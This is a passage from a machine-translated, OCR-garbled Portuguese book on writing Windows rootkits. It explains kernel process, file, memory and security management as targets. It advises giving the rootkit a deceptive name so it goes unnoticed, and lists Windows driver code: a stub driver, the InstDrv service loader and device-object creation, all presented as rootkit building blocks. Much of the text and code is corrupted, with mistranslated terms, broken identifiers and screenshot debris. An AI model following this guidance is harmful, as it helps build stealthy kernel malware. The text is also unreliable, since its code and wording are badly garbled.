É estudar o método “Poke Scientific”, que faz essa ou outra função.
Mas para escrever rutkit, você terá que seguir o caminho do maior
Titus.Afinal, você não acha que o próprio sistema operacional fornece
reside em fundos que permitem controlá -lo completamente?Espero que
O fato de esses fundos estar bem documentados também não são necessários.
No próximo capítulo, começaremos a escrever nosso primeiro (bastante simples)
Rutkin para Windows.Vamos começar com o básico - com a introdução à organização do inicial
código e da configuração do meio de programação.Também teremos que saber
O básico do núcleo e sua interação com os drivers de dispositivos.
Para entender como o rutkit pode "absorver a reputação" do núcleo
A destruição do núcleo, você precisa saber quais tarefas o núcleo da sala de operações
sistemas.As principais funções do núcleo são:
•
Gerenciamento de processos;
•
Fornecendo acesso a arquivos;
•
Gerenciamento de memória;
•
Segurança.
4.8.1.Gerenciamento de processos
Como a multitarefa é alcançada?Afinal, a simultaneidade real
A implementação de vários processos é alcançada apenas no multiprocessador
Máquinas: quantos processadores independentes, tantos processos e MO
pode ser realizado em paralelo.
A multitarefa em uma máquina de um processador é organizada programaticamente.
Considere o esquema clássico de gerenciamento de processos - modelo de três
estados.O modelo consiste em:
•
estado de execução;
•
estados de espera;
•
estado de prontidão.
Em que:
•
Executar é um estado ativo durante o qual o processo
Tem todos os recursos que ele precisa.Neste estado
O processo é executado diretamente pelo processador.
116

pagina: 116

Capítulo 4. Crença com tabelas de sistema 
• 
Esperar é um estado passivo durante o qual o processo 
Bloqueado, não pode ser cumprido porque espera KA
algum tipo de evento, por exemplo, inserindo dados ou a liberação do direito 
Ele tem dispositivos. 
• 
A prontidão também é um estado passivo, o processo também é
Morto, mas diferente do estado de espera, não está bloqueado 
por razões internas (expectativa de um evento) e por razões fora
Shnim, independente do processo. 
Quando o processo pode ir para um estado de prontidão?Vamos fingir que 
Nosso processo foi realizado antes da entrada de dados.Até esse momento, ele estava em
a execução, depois passou em um estado de espera - ele precisa
Aguarde até inserirmos as informações necessárias para o processo.Então 
O processo já queria entrar em um estado de execução, pois tudo é necessário
Os dados já foram inseridos por ele, mas não estava lá: já que ele não é o único
O processo no sistema, enquanto ele estava em um estado de espera, seu "lugar sob 
Tornou -se ocupado com o sol ” - o processador começou a realizar outro processo.Então 
Nosso processo não tem escolha a não ser entrar em um estado de prontidão: 
Ele não tem nada para esperar, mas também não pode ser feito. 
De um estado de prontidão, o processo só pode entrar em um estado de você
Filies.Apenas um processo pode estar em um estado de execução 
por processador.Se você tem uma máquina n-processadora, você tem ao mesmo tempo 
Em um estado de execução, pode haver p de processos.Do estado da execução
O processo pode entrar em um estado de espera ou em um estado 
prontidão.Por que o processo pode estar em um estado de espera, nós 
Já sabemos - ele só precisa de dados adicionais ou espera 
liberação de algum recurso, por exemplo, dispositivo ou arquivo. 
O processo pode entrar em um estado de prontidão se for alocado para ser alocado
seu quantum da época da execução.O sistema operacional tem um específico
um programa - um planejador que garante que todos os processos
Todos os todos foram atribuídos.Por exemplo, temos três processos. 
Um deles está em um estado de execução.Dois outros são capazes 
prontidão. 
O planejador monitora a hora do primeiro processo se 
"Time passou", o planejador transfere processos 1 em um estado de prontidão, 
E o processo 2 está no estado de execução.Então, quando o tempo atribuído 
A execução do processo 2 terminará, o processo 2 entrará em um estado de pronta
nosti e processo 3 - em um estado de execução. 
O diagrama do modelo de três estados é mostrado na FIG.4.7. 
117

pagina: 117

Rootkits 
Desempenho 
Prontidão 
V 
Expectativa 
Arroz.4.7.Diagrama de modelos de três estados 
O modelo de três estados é um clássico, examinamos apenas para 
para dar uma idéia geral de multitarefa. 
As informações sobre processos são armazenadas em uma certa estrutura na memória.EM 
O Windows é uma estrutura PSActiveProcessList.Modificou os elementos 
Essa estrutura, Rootkit, pode ocultar os processos de que precisa.Em geral 
A idéia de ocultar processos foi apresentada no capítulo 1. 
4.8.2.Fornecendo acesso a arquivos 
Uma das principais funções do sistema operacional é o controle do FIE
Lami, isto é, a organização do sistema de arquivos.Não é de admirar que a Microsoft a tenha chamado 
O primeiro sistema operacional DOS - Sistema Operacional de Disco - Disco 
sistema operacional.Isso significa que sua principal função é 
Gerenciamento de dados registrado no disco. 
O arquivo do ponto de vista de um computador é uma sequência de zeros e unidades, 
E o disco rígido é apenas uma mistura desses mesmos zeros e unidades.Arquivo 
O sistema organiza toda essa mistura para que seja conveniente para nós trabalharmos
Tati com arquivos e catálogos. 
O sistema operacional pode suportar vários sistemas de arquivos.Sobre
Exemplo, versões recentes do Windows (2000/XP) são suportadas por gordura (16/32), 
NTFS, UDF e ISO 9660 (os dois últimos são usados ​​para acessar o CD). 
Teoricamente, você pode "ensinar" o sistema a trabalhar com qualquer sistema de arquivos 
- Para isso, você precisa apenas de um driver deste sistema de arquivos.Popular 
Gerenciador de arquivos total comandante sabe como trabalhar com o sistema de arquivos 
Linux - ele tem um driver para acesso a este sistema de arquivos. 
Modificou o código principal responsável pelo acesso ao sistema de arquivos, 
Rutkin pode ocultar os arquivos e catálogos necessários. 
118

pagina: 118

Capítulo 4. Crença com tabelas de sistema 
4.8.3.Gerenciamento de memória 
Algumas plataformas de hardware, como a família do processador Intel 
Pentium, use esquemas complexos de gerenciamento de memória.Suponha 
Um processo leu a célula de memória com endereço 0x00302211 e recebeu o conhecimento
127, outro processo leu a célula com o mesmo endereço, mas o piso
Chil é completamente diferente.Acontece que no mesmo endereço 
Existem valores completamente diferentes?O fato é que todo processo 
Funciona em seu espaço direcionado sem perceber outros processos.Esse 
Feitos para que os processos não interfiram entre si. 
Cada método tem suas próprias desvantagens (leia - vulnerabilidades).Usando 
A vulnerabilidade desse esquema de gerenciamento de memória, podemos ocultar dados de 
Debuggers e programas de exame forense. 
4.8.4.SEGURANÇA 
Somente o núcleo é responsável pela segurança dos processos.Para que um processo não pudesse 
Evite o trabalho de outro processo, o Unix e o Windows usam pregos
Acesso, bem como para cada processo, um intervalo separado é atribuído 
memória.Tendo feito uma ligeira mudança em parte do núcleo responsável pela provisão
Segurança, podemos remover todas as restrições impostas a 
processos.Depois disso, uma anarquia real começará ... 
119

pagina: 119

Capítulo 5. Escrevemos 
PRIMEIRO 
MOTORISTA 
DDK (Kit de Desenvolvimento de Motoristas) 
Fontes e arquivos makefile 
Assembléia do motorista 
Depuração.DebugView Utility 
Carregando do motorista 
Pacotes de solicitação de entrada/saída 
Esquema de dois níveis rutkin 
Rootkits

pagina: 121

Vale a pena perceber imediatamente que o rutkit é sempre desenvolvido para um específico
sistema operacional ou software.Na maioria dos casos
Evkutkita está anexado não apenas ao sistema operacional, mas também à sua versão, mas
Às vezes, mesmo para a versão do lançamento.Por exemplo, você pode criar um rootkit que vai
Crianças para trabalhar no Linux Mandrake 10.x, mas isso não significa que funcione
No Red Hat Linux.Existem restrições mais graves: Rutkin para Windows
O XP SP1 não funcionará necessariamente no Windows XP SP2.De forma similar
É quase impossível criar uma raiz universal para o Linux, que
Eu trabalharia com o núcleo da versão 2.4 e 2.6.E crie cross -platform
Rutkit, que infectaria, por exemplo, todas as versões do Windows e todas
As versões do Linux são geralmente algo do gênero de ficção científica.
Rutkin pode ser implementado na forma de módulos de núcleo (em Linux) ou drivers
dispositivos (no Windows).É provável que você queira criar alguns
para diferentes módulos/drivers.Um, por exemplo, será usado para
Ocurações de arquivos e outros processos.
O processo usual do usuário não pode "chegar" ao núcleo.
Para adicionar seu código ao núcleo, você precisa usar o módulo carregado
(Outro nome é o driver ou o módulo de núcleo).Esta oportunidade é suportada
são todos os sistemas operacionais modernos, incluindo Windows
e Linux.
Os módulos permitem expandir os recursos do sistema operacional, adicione
funções adicionais, como apoiar alguns
Dispositivos ou sistema de arquivos.
Por que o uso de módulos é da maneira mais simples?Sim
O fato de que, além dos módulos, não há nada criminoso, então o todo
122

pagina: 122

Capítulo 5. Escreva o primeiro driver
O processo de desenvolvimento de módulos está bem documentado.Na verdade, uma pessoa
Um Deus de uma deficiência de diretrizes para criar um módulo ou driver de núcleo Linux
Os dispositivos Windows não são observados.
Pelo nome, fica claro que o "driver de dispositivo" foi projetado para gerenciamento
O dispositivo, portanto, o driver recebe acesso total
ao "ferro", bem como à memória privilegiada do núcleo e do sistema
Cesas.Com o nível de acesso do núcleo, você pode modificar o código e
Estruturas de dados de qualquer programa instalado no computador.
Portanto, a solução perfeita para o desenvolvedor do Rutkit é uma organização
Rutkita como motorista de um determinado dispositivo.Neste capítulo, apresentaremos
Xia com ferramentas para desenvolver e depurar drivers para Windows e escrever
O primeiro motorista.
5.1.DDK (Kit de Desenvolvimento de Motoristas)
Você precisará de um pacote para escrever drivers Windows 2000/XP/2003
Para o desenvolvimento de drivers - DDK (Kit de Desenvolvimento de Motoristas).Encomende um disco
Com DDK, você pode em: http: // www .microsoft.Com/ddk.Ordem
DDK para Windows 2003 - Usando esta versão, você pode escrever secos
Fé para Windows 2000, XP e 2003.
OBSERVAÇÃO.
Anteriormente, o DDK poderia estar livre da Microsoft.Agora podemos
Mas apenas peça um disco.O custo do pedido é de apenas US $ 25, mas
Ainda não os quero de qualquer maneira - ainda mais Microsoft'y.Na época
Escrituras
Esses
linhas
DDK
Pode
era
de graça
download
Por
endereço:
http://www.freedownloadscenter.com/best/download-xp-ddk.htmlnnn de
aqui:
h t p: / / m s d l.M i c r o s f t.C o m / d o w n l o d / s y m b o l s / p a s g e s /
Windowsxp/windowsxp-kb835935-sp2-slp-symbols .exe (195 MB).
TODOS DDK AT: H T T P: / / C L U B.s h e l e k.C o m / v i e w f i l e s.p h p?I D = 2.
O DDK fornece dois meios de layouts - verificado (verificado) e seu
Bodny (grátis).O teste é diferente de livre no que o compilador
Adiciona informações de depuração ao driver compilado.Tchau
Seu motorista está em desenvolvimento, você sempre deve usar
para o ambiente de inspeção do layout.Quando você tem certeza de que o seu
O motorista funciona como deveria, você pode escolher um ambiente gratuito.Também vale a pena
123

pagina: 123

Rootkits
Observe que o tamanho do driver "livre" é muito menor
Reduzido ” - Afinal, as informações de depuração são excluídas do motorista.
Depois de instalar o DDK no menu do seu programa, um software aparecerá
Grupo DDK do Windows com rótulos correspondentes ao testado e seu
Bodge quartas -feiras.Clicar em um desses atalhos abrirá a janela de comando
Linha Noah, na qual dezenas de cerco será instalado.
Você pode escrever o código -fonte do driver em qualquer editor de texto
ou instalar o ambiente de desenvolvimento conveniente para você e coletar um projeto do qual
Mandy Line by the Build Command.
5.2.Fontes e arquivos makefile
O código -fonte do driver está escrito no idioma de S., vamos concordar que o código
Você salvará nosso primeiro driver em: \ Myrootkit \ Mydriver.Com.
Além do arquivo de origem, mais dois funcionários serão necessários para montar o projeto
Arquivos: Fontes e Makefile no mesmo catálogo com: \ Myrootkit.Nomes
Ambos os arquivos devem estar no registro superior, ou seja, apenas makefile,
Não makefile ou makefile.Também verifique se esses arquivos têm
Não houve extensões - afinal, alguns editores de texto (como um bloco
nota) adicionar automaticamente uma expansão predefinida (geralmente
.TXT).
O arquivo makefile deve conter apenas uma linha:
!
Incluir (
$ Ntmakeenv)
\ makefile
.
Def
Esta linha inclui um arquivo de maquiagem padrão localizado no subcatal
Bin é o catálogo onde o DDK está instalado.
No arquivo de fontes, as opções do projeto são muito maiores.O arquivo mais simples
Fontes se parecem com a seguinte:
TargetName = MyDriver
TargetPath = OBJ
TargetType = Driver
Fontes = mydriver.s
Diretiva t
A
R
G
E.
T
N
A
M
E contém o nome do driver.Para escolher um nome para as rotas
Deve ser abordado muito seriamente.Espero que você não chame sua raiz
Kit my_rootkit ou i_will_destroy_your_system.O nome deve receber isso
Alguém, para que ninguém adivinhe.Aqui estão exemplos de bons nomes: msdirectSound,
SNDCTRL, MSDirectX (como Rutkin Fu), XVGADRV, IDE_CTRL, KRNL32.
Diretiva TargetPath permite especificar o catálogo em que
Sannah é arquivos compilados.Catálogo geralmente usado 0bj - não
Mude.
124

pagina: 124

Capítulo 5. Escreva o primeiro driver
A terceira diretiva, TargetType, deve sempre conter o valor do driver,
Se você quiser, é claro, compilar o motorista.
A Diretiva de Fontes contém uma lista.S-Fileov.Fontes listam arquivos
Eles são divididos usando a barra reversa:
Fontes = filel .s \
File2.c
\
Arquivo3.Com
Se o seu projeto usar arquivos de cabeçalho, você pode adicionar
Incluir diretiva, que determina a lista de catálogos em que
Pesquise arquivos de título.Por exemplo:
Incluir = c: \ my_rootkit \ incluir \
D: \ Incluir
No arquivo de fontes, você pode usar outra diretiva - TargetLibs.
É usado para especificar a lista de bibliotecas necessárias para o seu
projeto que deve ser combinado com ele:
TargetLibs = Biblioteca].
.
Lib
Você pode usar duas variáveis ​​para especificar as faixas:
•
($ Basdir) - um catálogo no qual o DDK está instalado;
•
($ Ddk_lib_path) - catálogo da biblioteca DDK (por padrão
($ Basdir) \ e b \ <sobre c> \ <p l a t f o r ma>,
Por exemplo,
($ Baseado) \
I B \ W 2 K \ I 3 8 6).
Exemplo:
TargetLibs = ($ ddk_lib_path) \ libary.lib
5.3.Assembléia desenhe vera
O driver mais simples consistirá apenas no ponto de entrada - função
DriverEntry - e as funções causadas ao tentar descarregar
Driver da memória.Vamos chamá -la de MyUnload.Conteúdo do arquivo c: \ myrootkit \
Meu motorista.C é dado na Listagem 5.1.
Listagem 5.1.Motorista que não faz nada
Linclude "ntddk.h"
Ntstatus myunload (em pdriver_object driverObject)
{
Dbgprint ("Driver de descarga ...");
Retorno o sucesso do status;
125

pagina: 125

Rootkits 
} 
Ntstatus driverEntry (em pdriverjdbject driverObject, 
Em punicode_string o caminho) 
{ 
Dbgprint ("Olá, mundo!"); 
DriverBject-> driverUnload = MyUnload; 
Retornar status_success; 
) 
Agora vamos tentar compilar o que escrevemos.Inicie sua mente
O DDK verificou e vá para o catálogo do projeto C: \ Myrootkit.Digitar 
Comando de construção.Se você marcou o texto de origem sem erros de digitação, o resultado 
- Arquivo MyDriver.SYS - aparecerá no subcatal em objchk \ i38 6. 
5.4.Depuração.DebugView Utility 
Você notou que, na Listagem 5.1, existem chamadas para as funções do DBGprint. 
Serve para retirar a dívida do motorista depurada. 
Onde essas mensagens serão exibidas? 
O Programa Debugview pretende recebê -los e exibi -los, 
qual 
Pode 
download 
Com 
site 
www.sysinternals.com 
(http://wwww.sysinternals.com/files/debugViewont.zip). 
É muito simples de usar o DebugView - execute -o e você pode
Veja todas as mensagens de dívida em sua janela (Fig. 5.1). 
A função dbgprint exibe mensagens quando o programa funciona para 
Nível de núcleo (como nosso motorista).Para depurar fragmentos de código, trabalho
derretendo no nível do usuário, outra função é destinada 
- OutputDebugString.O utilitário DebugView pode exibir linhas, 
exibido por ambas as funções.Para interceptar os níveis do nível de benefício
Vatel precisa ativar a bandeira Capture- Capture Win32 e para mensagens 
Nível do núcleo - Capture-> Capture kernel. 
As interceptações das mensagens de nível central são possíveis apenas quando a DebugView 
Lançado com o nível de privilégios que permitem carregar os drivers 
(Provavelmente, você trabalhará na conta do administrador). 
5.5.Carregando do motorista 
O motorista montado ainda precisa ser registrado no sistema e lançado.Sobre 
O momento de escrever essas linhas no site www.Rootkits.Com pode ser alto
Cheth um utilitário com uma interface gráfica Instdrv (Fig. 5.2), mas você precisa 
126

pagina: 126

Capítulo 5. Escreva o primeiro driver 
Um método mais eficaz de instalar/iniciar o driver - você não vai 
Aproxime -se de cada computador e pressione Instalar/Iniciar?É por isso que nós 
Damos o código do motorista simples que trabalha com o comando 
Linhas gentis fornecidas pela Microsoft Corporation.Ele usa 
Gerente de controle de sessão. 
*.. Debuovtew On \\ OEP (LOCA 
6* 
& 
_ 
Sh 
236 
237 
233 
239 
24 0 
2*1 
242 
243 
244 
245 
246 
24 7 
246 
249 
250 
251 
252 
253 
254 
255 
255 
257 
25s 
259 
260 
261 
262 
263 
264 
265 
266 
26 7 
268 
269 
270 
271 
272 
273 
274 
275 
276 
27? 
278 
279 
230 
; 
U i 
%• '! • ¥-
J. Ti "O 
19:28:58 
19:20 Então 
19:20:50 
19:28:58 
19 28 S8 
19:28:50 
19:28:58 
19.28 58 
19:28:58 
19: 28.58 
19.28 58 
19:28:58 
19:20:58 
19:28 58 
19:20:58 
19:20:50 
19:28:58 
19:28 58 
19: 28.58 
19:28:58 
19 28 58 
19:28:58 
19:28 58 
19 28 58 
19:28 58 
19:28:50 
19:20 58 
19:28:58 
19:20 50 
19: 28.58 
19:28:50 
19:20:58 
19:28:58 
1 9: 2 8 5 8 
19:28:58 
19:28:58 
19 28:58 
19:20:50 
19:20:50 
19 28 58 
19:29:58 
19:20:58 
19 20 58 
19:28:58 
19:20:50 
19.20 58 
lu ^u ei 
) 
• m 
: Hdf> 
) & © "© '(v'4? • l -'- • 
Debug Pri.N.H ---- ••• 
• 
. 
1604 
160 4 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
U 0 4 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
1604 
Uil, l 
Olá!Eu até o meu segundo D r i v e r!!N 
19:28:58 
E'vjprocea: s “jiid4lo_change 
0x00000798: 
19:28:58 
{~] processo; 
19:28:59 
[~] Proces.3_*adule_cbenge 0x00000798. 
19:28:58 
[~] Proces.s „*odule_.Change 0x00000798: 
19:28:58 
R. ~] Process_*odule_ehange 0x00000798: 
19:28:58 
["IPRQCVMUMODULW.CHANGE 0X000007^8. 
19:28 58 
I ~] prdcess_iidule_change 0x00000798: 
19:28:58 
[~] Process_itodule_cwige 0x00000793: 
19:28:58 
[~] Procees _> »qdule_change 0x00000798. 
19:28:58 
[~] Process_ »odule_ch.!) Rige 0x00000798 • 
19:28:59 
•."" • V
" 
.
.
-
-
-
• 
Afphelp w 
CSCUI DLL 
CSCDLL DLL 
Brooseui dll 
Htshfui dll 
4tl.dli 
Netipi32.dll 
Hlanu.dll 
Shdocvw dll 
Li1ikihf0.dll 
["" H1344] DETECT MODULE LOAD: C: Vyindows \ SYG.TAM32 \ HETAPI.32 D L L L L l 
19.28: 58 
[**] n944] módulo de detecção Losd;C: \ wihdous4*yste ”3 2vm'ukg.dj.
1 
19:28:58 
[~ H1944] Detectar o carregamento do módulo: 
G: MIIHD0VSN8Y9TEH324TJS £ Relw.dll 
19:28:58 
L ~] [1944] HETET *Carga de odule: C: \ Wihdovs4> Systei.32'-Appkelp.D l l 
19:28:58 
1 ~ n1944] oe1s1 nodule Load: C: \ uihdoysnSySTE "32 \ BROWSEUI D L L L l 
Jaj^y 
.." 
' 
" 
-onze 
Arroz.5.1.DebugView Utility 
Fufl Pathname of Drive* 
EU 
Instalar 
Slat 
Status: 
Inclinação 
Remover 
Fechar 
*J. 
Arroz.5.2.Utilitário Instrv 
Dessa forma, o motorista é carregado em uma memória descarregada, ou seja, unidades
O VER não pode ser descarregado no disco durante o processo de bombeamento.Você pode 
Use o código fornecido para o seu programa Rutkit Bootloader. 
127

pagina: 127

Rootkits
Há outra maneira de carregar o motorista baseado em não -salgadouro
SystemLoadCall Image Diged API Chamada.De rotas famosas
Tov o usa, por exemplo, Fu, cujo código -fonte pode ser baixado de
www.rootkit.com.
Listagem 5.2.Carregando e iniciando o motorista.Utilitário Instrv
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
Bool Installdriver (
Em sch_handle schscmanager,
Em LPCTSTR
Nome do motorista,
Em LPCTSTR
Serviceexe
))
Bool RemovedRiver (
Em sch_handle schscmanager,
Em LPCTSTR
Nome do motorista
);
Bool Startdriver
(
Em sch_handle schscmanager,
Em LPCTSTR
Nome do motorista
);
Bool Stopdriver (
Em sch_handle schscmanager,
Em LPCTSTR
Nome do motorista
);
Bool opendevice (no nome do LPCTR);
VAZIO
CDECL Main (in argc, em char *argv [])
{
Sc_handle
Schscmanager;
if (argc! = 3)
sys \ n '
CharrentDirectory [128];
Printf ("Uso: instdrv <nome do driver> <.sys Location> \ n");
Printf (
"Para instalar um driver de dispositivo no modo de kernel, ou: \ n");
Printf (
"Instrv <nome do driver> Remover \ n");
Printf (
"Para remover um driver de dispositivo no modo de kernel \ n \ n");
GetCurrentDirectory (128, CurrentDirectory);
Printf ("Exemplo: instdrv simpldrv %s \\ obj \\ i386 \\ simpldrv.
Diretório atual);
Saída (1);
Schscmanager = openScManager (null, // computador local
128

pagina: 128

Capítulo 5. Escreva o primeiro driver 
Null, // banco de dados por padrão 
Sc_manager_all_access // direitos de acesso 
); 
if (! _stricmp (argv [2], "remov"))) 
{ 
Stopdriver (Schscmanager, argvfl]); 
Removedriver (schscmanager, argvtl]); 
} 
Outro 
( 
Installdriver (schscmanager, argvfl], argv [2]); 
StartDriver (Schscmanager, Argv [L]); 
Opendevice (argvfl)); 
} 
ClosseservieHandle (Schscmanager); 
} 
Bool Installdriver ( 
Em sch_handle schscmanager, 
Em LPCTSTR 
Nome do motorista, 
Em LPCTSTR 
Serviceexe 
) 
f 
/* Esta função carrega um driver separado (independente).Se lembrar
A doca de carregamento deve afetar tags prioritárias ou prioritárias, MO
Direcione o código adicionando os valores das chaves hklm \ system \ 
CurrentControlset \ Control \ ServiceGroupord e Grupo e Parâmetros de Tags 
Key ikem \ 8u5 \ siggeep1sop1g15eg, \ 5epchse5 \ nome do driver 
*/ 
SC_HANDLE SCHSERVICE; 
DWORD 
errar; 
SchService = CreateService (Schscmanager, 
Nome do motorista, 
// Nome do Serviço 
Nome do motorista, 
// Nome exibido 
Service_all_access, 
// Direitos de acesso 
Service_kernel_driver, // Tipo de serviço 
Service_demand_start, // Tipo de lançamento: a pedido 
Service_error_normal, // Tipo de processamento de erros 
Serviceexe, 
// arquivo executável 
Nulo, 
// Grupo de disposições de carregamento 
Nulo, 
// tag de prioridade 
Nulo, 
// Dependências 
Nulo, 
// Conta 
Nulo 
// senha 
5 Zak.665 
129

pagina: 129

Rootkits
if (schservice == null)
{
err = getLasterRor ();
if (err == error_service_exists)
{
printf ("Falha: createService, error_service_exists \ n");
}
outro
{
printf ("Falha: CreateService (0x%02x) \ n", err);
}
retorna falso;
}
outro
{
printf ("CreateService succcessxn");
}
ClosseservieHandle (SCHSERVICE);
}
Bool RemovedRiver (
Em sc_handle schscmanager,
Em LPCTSTR
Nome do motorista
)
{
SC_HANDLE SCHSERVICE;
Bool ret;
SchService = OpenService (Schscmanager,
Nome do motorista,
Service_all_access
);
if (schservice == null)
{
printf ("Falha: OpenService (0x%02x) \ n", getLasterRor ());
retorna falso;
1
ret = deleteService (SchService);
se (ret)
(
printf ("DeleteService succcessxn");
}
outro
{
printf ("Falha: DeleteService (0x%02x) \ n", getlasterror
()
);
}
ClosseservieHandle (SCHSERVICE);
retornar ret;
130

pagina: 130

5.пшишем перый дlex д й п quer 
Bool Startdriver ( 
Em sc_handle schscmanager, 
Em LPCTSTR 
Nome do motorista 
) 
{ 
SC_HANDLE SCHSERVICE; 
Bool 
ret; 
DWORD 
errar; 
SchService = OpenService (Schscmanager, 
Nome do motorista, 
Service_all_access 
); 
if (schservice == null) 
( 
printf ("Falha: OpenService (0x%02x) \ n", getLasterRor ()); 
retorna falso; 
} 
ret = startService (schservice, 
0, 
// колferir 
NULO 
// você 
); 
se (ret) 
{ 
printf ("StartService Success \ n"); 
} 
outro 
{ 
err = 
GetLasterRor (); 
if (err == error_service_already_running) 
{ 
printf ("Falha: startService, error_service_already_running \ n") 
} 
outro 
{ 
printf ("Falha: startService (0x%02x) \ n", err); 
ClosseservieHandle (SchService) 
retornar ret; 
} 
Bool Stopdriver ( 
Em sc_handle schscmanager, 
Em LPCTSTR 
Nome do motorista 
) 
( 
Sc_handle 
SCHSERVICE; 
Bool 
ret; 
Status de serviço servicestatus; 
131

pagina: 131

Rootkits 
SchService = OpenService (Schscmanager, 
Nome do motorista, 
Service_all_access 
); 
if (schservice == null) 
{ 
Printf ("Falha: OpenService (0x%02x) \ n", getLasterRor ()); 
Retorna falso; 
} 
RET = ControlService (SCHSERVICE, 
Service_Control_Stop, 
SSERVICESTATUS 
); 
se (ret) 
{ 
Printf ("ControlService succcessw) 
; 
} 
Outro 
{ 
Printf ("Falha: ControlService (0x%02x) \ n", getLasterRor ()); 
} 
ClosseservieHandle (SCHSERVICE); 
Retornar ret; 
) 
Bool Opendevice (em LPCTSTR 
Nome do motorista) 
( 
Caracteres 
CompletEdEvicename [64] = ""; 
LPCTSDRO DOSDEVICENAME = DRIVERNAME; 
Lidar 
Hdevice; 
Bool 
Ret; 
// 
// Crie o nome do dispositivo que o driver controla: 
// \\. \ Nome do motorista. 
// Supõe -se que o próprio motorista criou um simbólico 
// link "\ Dosdevices \ Drivername". 
// Se não for esse o caso, modifique o código adicionando visualização 
// seção do registro de devemap ou lista de visualização 
// Links simbólicos chamando a função QueryDosDevice. 
// 
strcat (concluído o nome "\\\\. \\"); 
Strcat (completEdEviceName, Dosdevicename); 
Hdevice = createfile (completEdEviceName, 
Geneeric_read | 
Geneeric_write, 
0, 
Nulo, open_existing, 
File_attribute_normal, 
Nulo 
132

pagina: 132

Capítulo 5. Escreva o primeiro driver 
) 
; 
if (hdevice == ((manipulação) -1)) 
{ 
Printf ("Não é possível obter um identificador para %s \ n", completEdEviceName); 
Ret = false; 
} 
Outro 
{ 
Printf ("createfile succcessw); 
CloseHandle (hdevice); 
Ret = true; 
1 
Retornar ret; 
) 
Colete (ou download) um utilitário Instdrv e tente baixá -lo
Seu motorista Helloworld.Você conseguiu abrir o dispositivo?Certo, 
Afinal, nosso motorista ainda não passa de um modelo e não 
O dispositivo não controla.Agora vamos mostrar como criar e registrar
No sistema, um dispositivo chamado "MyDevice".Depois disso, a operação
O sistema pode recorrer a este dispositivo como um arquivo regular. 
Se você já trabalhou com o Unix, provavelmente notou uma analogia.EM 
O Unix está em silêncio para abrir qualquer dispositivo como um arquivo e trabalhar com ele o mesmo 
Como em um arquivo regular. 
Além do nome do dispositivo, também registraremos um link simbólico 
Nele "\ Dosdevices \ myDevice", que requer a função do carregador de inicialização 
Opendevice.De um modo geral, a presença de um vínculo simbólico não é vinculativa
Mas: se você não usar o utilitário de carga padrão e não estiver indo 
Forneça a outros aplicativos a oportunidade de entrar em contato com seu bigode
Tryuster, você não pode criar nenhum link.Então sobre o seu dispositivo
Somente o seu Rutkit saberá.Algumas rotas (por exemplo, Fu) 
Usando links simbólicos, e alguns não. 
O dispositivo é gravado durante o desempenho da função do drivertry 
(Listagem 5.3).Para criá -lo, uma chamada é a função ICREATEVICE, um 
Para criar um link - icreatSymbolicLink.Os nomes do dispositivo e sim
O link de cera deve estar na codificação do Unicode. 
Ao descarregar o driver da memória (durante o desempenho da função Onunload) 
é necessário remover o dispositivo registrado e simbólico 
link.O objeto do dispositivo é conhecido na função Onunload, porque
O Chumber nele está contido na estrutura do driverjdbject, um ponteiro para o qual
Ruya é transmitido para a função Onunload ao chamá -la.Para transferir para lá 
O indicador para o unicode -line - o nome do link, - determinaremos adicionalmente 
Device_Extance Structure. 
133

pagina: 133

Rootkits 
Listagem 5.3.Criando um dispositivo 
• Inclua <ntddk.h> 
Typedef Strect _Device_Extension 
{ 
Pdevice_object PDO; 
Unicode_string ustrSymlinkName; 
} Dispositivo_extension, *pdevice_extance; 
Void onUnLload (em pdriver_object pdriverbject) 
{ 
Pdevice_Object pnextDevoBJ; 
int i; 
Dbgprint ("onlineload"); 
pnextDevoBJ = pdriverObject-> deviceObject; 
for (i = 0; pnextDevoBJ! = null; i ++) { 
Pdevice_extension dx = 
(Pdevice_extension) pNextDevoBJ-> Devicextance; 
// Link simbólico para remoção 
Unicode_string *parkname = & (dx-> ustrSymLinkName); 
// Salve o ponteiro para o seguinte dispositivo: 
pnextDevoBJ = pNextDevoBJ-> NextDevice; 
Dbgprint
%
D.
): .Pointer para PDO = 
%X. 
I, dx-> PDO); 
Dbgprint ("Onunload 
Excluindo o Symlink = %ws.
> Buffer); 
// Exclua um link simbólico 
IDELETESYMBOLICLINK (PLINKNAME) 
; 
// Exclua o dispositivo 
LoDeleteDevice (DX-> PDO); 
NTSTATUS DriverEntry ( 
Em pdriver_object pdriverbject, 
Em punicode_string pregistryPath) 
( 
Status ntstatus = status_success; 
Pdevice_object PDO; 
Unicode_string devName; 
Unicode_string simlinkName; 
Pdevice_extension dx; 
Dbgprint 
Dbgprint ("RegistryPath = %ws.", PregistryPath-> buffer); 
// Crie cópias das linhas unicode para os nomes do dispositivo 
// e link simbólico 
Rtlnitunicodestring (sdevName, l "\\ dispositivo \\ myDevice"); 
Rtllnitunicodestring 
(
& 
SymlinkName, 
EU "\\ 
Dos 
Dispositivo 
SwmyDevice ") 
; 
Pdriverobject-> driverUnload = OnUnload; 
134

pagina: 134

Capítulo 5. Escreva o primeiro driver 
// Crie um dispositivo 
Status = icreatevice (pdriverObject, 
Sizeof (device_extension), 
Sdevname, 
File_device_uunknown, 
0, 
Falso, 
Sfdo); 
se ( 
! 
Dbgprint 
Status de retorno; 
} 
dx = (PDevice_Extance) PDO-> Devicextance; 
dx-> PDO = PDO; 
dx-> ustrSymLinkName = symlinkName; 
// Crie um link simbólico 
Status = ocialatesmbolicLink (sSymLinkName, sdevName); 
if (! nt_success (status)) { 
IDELEDEDEVICE (PDO) 
; 
Status de retorno; 
} 
Dbgprint ("DriverEntry concluído com êxito"); 
Status de retorno; 
) 
Agora qualquer programa de usuário, incluindo o utilitário de carregamento 
Instdrv, pode abrir o arquivo do nosso dispositivo, como um arquivo regular: 
Hdevice = createfile ("WW. 
Wmydevice ", 
Geneeric_read | 
Genérico_write, 0, null, 
Open_existing, file_attribute_normal, null); 
Depois disso, você pode usar as funções usuais de leitura/gravação de arquivos, 
Indicando a variável HDevice como o descritor de arquivo. 
Imagine que o programa de usuário escreve algo em nosso 
Dispositivo MyDevice.Onde os dados registrados realmente conseguirão? 
O ponto a seguir é dedicado a isso. 
5.6.Pacotes de solicitação de entrada/saída 
